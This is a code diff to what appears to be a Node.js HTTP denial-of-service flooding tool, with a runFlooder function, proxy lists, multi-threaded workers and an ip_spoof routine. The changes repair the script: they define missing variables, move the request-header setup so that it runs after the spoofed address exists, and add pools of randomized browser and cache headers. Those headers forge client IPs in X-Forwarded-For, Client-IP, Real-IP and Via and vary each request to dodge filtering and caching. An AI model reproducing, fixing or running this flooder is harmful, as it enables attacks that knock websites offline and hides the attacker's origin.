@@ -651,16 +651,6 @@ accept_header = [
 ],
 
 encoding_header = [
-  'gzip, deflate, br',
-  'compress, gzip',
-  'deflate, gzip',
-  'gzip, identity',
-  '*'
-],
-
-controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
-
-encoding_header = [
   '*',
   '*/*',
   'gzip',
@@ -678,13 +668,13 @@ encoding_header = [
   'gzip, compress',
   'compress, deflate',
   'compress',
-  'gzip, deflate, br',
-  'deflate',
   'gzip, deflate, lzma, sdch',
   'deflate',
-]
+  'gzip, deflate, br'
+];
 
 controle_header = [
+  'no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400',
   'max-age=604800',
   'proxy-revalidate',
   'public, max-age=0',
@@ -736,13 +726,18 @@ controle_header = [
   'public, s-maxage=600, max-age=60',
   'no-store, no-cache, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
-  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
-]
+  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'
+];
 
 const Methods = [
   "GET",
 ];
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
+
+// Define missing variables used in headers
+const HTTPS = "https";
+const trailers = "trailers";
+const websocket = "websocket";
 
 const queryStrings = [
   "&", 
@@ -1064,10 +1059,61 @@ const uap = [
    return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
  };
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
- var proxies = readLines(args.proxyFile);
- const fakeIP = ip_spoof();
- var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
- const parsedTarget = url.parse(args.target);
+var proxies = readLines(args.proxyFile);
+const fakeIP = ip_spoof();
+var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
+const parsedTarget = url.parse(args.target);
+
+// Set headers after fakeIP is available
+headers[":method"] = randomMethod;
+headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+headers["origin"] = parsedTarget.host;
+headers["Content-Type"] = randomHeaders['Content-Type'];
+headers[":scheme"] = "https";
+headers["x-download-options"] = randomHeaders['x-download-options'];
+headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
+headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept-language"] = randomHeaders['accept-language'];
+headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
+headers["x-cache"] = randomHeaders['x-cache'];
+headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
+headers["accept-encoding"] = randomHeaders['accept-encoding'];
+headers["cache-control"] = randomHeaders['cache-control'];
+headers["x-frame-options"] = randomHeaders['x-frame-options'];
+headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
+headers["x-content-type-options"] = "nosniff";
+headers["TE"] = "trailers";
+headers["pragma"] = randomHeaders['pragma'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["upgrade-insecure-requests"] = "1";
+headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
+headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
+headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
+headers["X-Forwarded-Proto"] = HTTPS;
+headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
+headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["vary"] = randomHeaders['vary'];
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = trailers;
+headers["set-cookie"] = randomHeaders['set-cookie'];
+headers["Server"] = randomHeaders['Server'];
+headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
+headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
+headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
+headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
+headers["alt-svc"] = randomHeaders['alt-svc'];
+headers["Via"] = fakeIP;
+headers["sss"] = fakeIP;
+headers["Sec-Websocket-Key"] = fakeIP;
+headers["Sec-Websocket-Version"] = 13;
+headers["Upgrade"] = websocket;
+headers["X-Forwarded-For"] = fakeIP;
+headers["X-Forwarded-Host"] = fakeIP;
+headers["Client-IP"] = fakeIP;
+headers["Real-IP"] = fakeIP;
+headers["Referer"] = randomReferer;
 
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -1119,55 +1165,202 @@ const uap = [
 }
 
  const Socker = new NetSocket();
-headers[":method"] = randomMethod;
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
-headers["origin"] = parsedTarget.host;
-headers["Content-Type"] = randomHeaders['Content-Type'];
-headers[":scheme"] = "https";
-headers["x-download-options"] = randomHeaders['x-download-options'];
-headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
-headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
-headers["accept"] = randomHeaders['accept'];
-headers["accept-language"] = randomHeaders['accept-language'];
-headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
-headers["x-cache"] = randomHeaders['x-cache'];
-headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
-headers["accept-encoding"] = randomHeaders['accept-encoding'];
-headers["cache-control"] = randomHeaders['cache-control'];
-headers["x-frame-options"] = randomHeaders['x-frame-options'];
-headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
-headers["x-content-type-options"] = "nosniff";
-headers["TE"] = "trailers";
-headers["pragma"] = randomHeaders['pragma'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["upgrade-insecure-requests"] = "1";
-headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
-headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
-headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
-headers["X-Forwarded-Proto"] = HTTPS;
-headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
-headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["vary"] = randomHeaders['vary'];
-headers["x-requested-with"] = "XMLHttpRequest";
-headers["TE"] = trailers;
-headers["set-cookie"] = randomHeaders['set-cookie'];
-headers["Server"] = randomHeaders['Server'];
-headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
-headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
-headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
-headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
-headers["alt-svc"] = randomHeaders['alt-svc'];
-headers["Via"] = fakeIP;
-headers["sss"] = fakeIP;
-headers["Sec-Websocket-Key"] = fakeIP;
-headers["Sec-Websocket-Version"] = 13;
-headers["Upgrade"] = websocket;
-headers["X-Forwarded-For"] = fakeIP;
-headers["X-Forwarded-Host"] = fakeIP;
-headers["Client-IP"] = fakeIP;
-headers["Real-IP"] = fakeIP;
-headers["Referer"] = randomReferer;
+
+// Define missing header arrays
+const content_type_header = [
+    'text/html; charset=utf-8',
+    'application/json',
+    'application/x-www-form-urlencoded',
+    'text/plain',
+    'application/xml',
+    'text/xml',
+    'application/javascript',
+    'text/css'
+];
+
+const pragma_header = [
+    'no-cache',
+    'cache',
+    'no-store'
+];
+
+const sec_ch_ua_header = [
+    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    '"Chromium";v="118", "Google Chrome";v="118", "Not?A_Brand";v="99"',
+    '"Not_A Brand";v="99", "Chromium";v="121", "Google Chrome";v="121"'
+];
+
+const sec_ch_ua_mobile_header = [
+    '?0',
+    '?1'
+];
+
+const sec_ch_ua_platform_header = [
+    '"Windows"',
+    '"macOS"',
+    '"Linux"',
+    '"Android"',
+    '"iOS"'
+];
+
+const sec_fetch_dest_header = [
+    'document',
+    'empty',
+    'object',
+    'script',
+    'style'
+];
+
+const sec_fetch_mode_header = [
+    'navigate',
+    'cors',
+    'no-cors',
+    'same-origin'
+];
+
+const sec_fetch_site_header = [
+    'same-origin',
+    'same-site',
+    'cross-site',
+    'none'
+];
+
+const vary_header = [
+    'Accept-Encoding',
+    'Accept-Language',
+    'Origin',
+    'User-Agent'
+];
+
+const x_download_options_header = [
+    'noopen',
+    'open'
+];
+
+const cross_origin_embedder_policy_header = [
+    'require-corp',
+    'unsafe-none'
+];
+
+const cross_origin_opener_policy_header = [
+    'same-origin',
+    'same-origin-allow-popups',
+    'unsafe-none'
+];
+
+const referrer_policy_header = [
+    'no-referrer',
+    'no-referrer-when-downgrade',
+    'origin',
+    'origin-when-cross-origin',
+    'same-origin',
+    'strict-origin',
+    'strict-origin-when-cross-origin',
+    'unsafe-url'
+];
+
+const x_cache_header = [
+    'HIT',
+    'MISS',
+    'BYPASS'
+];
+
+const content_security_policy_header = [
+    "default-src 'self'",
+    "script-src 'self' 'unsafe-inline'",
+    "style-src 'self' 'unsafe-inline'",
+    "img-src 'self' data: https:",
+    "connect-src 'self'"
+];
+
+const x_frame_options_header = [
+    'DENY',
+    'SAMEORIGIN',
+    'ALLOW-FROM'
+];
+
+const x_xss_protection_header = [
+    '0',
+    '1',
+    '1; mode=block'
+];
+
+const set_cookie_header = [
+    'sessionid=abc123; Path=/; HttpOnly',
+    'user_pref=1; Path=/; Max-Age=3600',
+    'tracking=xyz; Path=/; Domain=.example.com'
+];
+
+const server_header = [
+    'nginx/1.18.0',
+    'Apache/2.4.41',
+    'cloudflare',
+    'Microsoft-IIS/10.0'
+];
+
+const strict_transport_security_header = [
+    'max-age=31536000; includeSubDomains',
+    'max-age=31536000; includeSubDomains; preload',
+    'max-age=63072000; includeSubDomains; preload'
+];
+
+const access_control_allow_headers_header = [
+    'Content-Type, Authorization',
+    'X-Requested-With, Content-Type, Authorization',
+    'Origin, X-Requested-With, Content-Type, Accept'
+];
+
+const access_control_allow_origin_header = [
+    '*',
+    'https://example.com',
+    'https://*.example.com'
+];
+
+const content_encoding_header = [
+    'gzip',
+    'deflate',
+    'br',
+    'gzip, deflate, br'
+];
+
+const alt_svc_header = [
+    'h3=":443"; ma=86400',
+    'h3-29=":443"; ma=86400',
+    'h3-28=":443"; ma=86400'
+];
+
+// Create randomHeaders object with random values from header arrays
+const randomHeaders = {
+    'Content-Type': content_type_header[Math.floor(Math.random() * content_type_header.length)],
+    'x-download-options': x_download_options_header[Math.floor(Math.random() * x_download_options_header.length)],
+    'Cross-Origin-Embedder-Policy': cross_origin_embedder_policy_header[Math.floor(Math.random() * cross_origin_embedder_policy_header.length)],
+    'Cross-Origin-Opener-Policy': cross_origin_opener_policy_header[Math.floor(Math.random() * cross_origin_opener_policy_header.length)],
+    'accept': accept_header[Math.floor(Math.random() * accept_header.length)],
+    'accept-language': lang_header[Math.floor(Math.random() * lang_header.length)],
+    'Referrer-Policy': referrer_policy_header[Math.floor(Math.random() * referrer_policy_header.length)],
+    'x-cache': x_cache_header[Math.floor(Math.random() * x_cache_header.length)],
+    'Content-Security-Policy': content_security_policy_header[Math.floor(Math.random() * content_security_policy_header.length)],
+    'accept-encoding': encoding_header[Math.floor(Math.random() * encoding_header.length)],
+    'cache-control': controle_header[Math.floor(Math.random() * controle_header.length)],
+    'x-frame-options': x_frame_options_header[Math.floor(Math.random() * x_frame_options_header.length)],
+    'x-xss-protection': x_xss_protection_header[Math.floor(Math.random() * x_xss_protection_header.length)],
+    'pragma': pragma_header[Math.floor(Math.random() * pragma_header.length)],
+    'sec-ch-ua-platform': sec_ch_ua_platform_header[Math.floor(Math.random() * sec_ch_ua_platform_header.length)],
+    'sec-fetch-dest': sec_fetch_dest_header[Math.floor(Math.random() * sec_fetch_dest_header.length)],
+    'sec-fetch-mode': sec_fetch_mode_header[Math.floor(Math.random() * sec_fetch_mode_header.length)],
+    'sec-fetch-site': sec_fetch_site_header[Math.floor(Math.random() * sec_fetch_site_header.length)],
+    'sec-ch-ua': sec_ch_ua_header[Math.floor(Math.random() * sec_ch_ua_header.length)],
+    'sec-ch-ua-mobile': sec_ch_ua_mobile_header[Math.floor(Math.random() * sec_ch_ua_mobile_header.length)],
+    'vary': vary_header[Math.floor(Math.random() * vary_header.length)],
+    'set-cookie': set_cookie_header[Math.floor(Math.random() * set_cookie_header.length)],
+    'Server': server_header[Math.floor(Math.random() * server_header.length)],
+    'strict-transport-security': strict_transport_security_header[Math.floor(Math.random() * strict_transport_security_header.length)],
+    'access-control-allow-headers': access_control_allow_headers_header[Math.floor(Math.random() * access_control_allow_headers_header.length)],
+    'access-control-allow-origin': access_control_allow_origin_header[Math.floor(Math.random() * access_control_allow_origin_header.length)],
+    'Content-Encoding': content_encoding_header[Math.floor(Math.random() * content_encoding_header.length)],
+    'alt-svc': alt_svc_header[Math.floor(Math.random() * alt_svc_header.length)]
+};
 
  
  function runFlooder() {
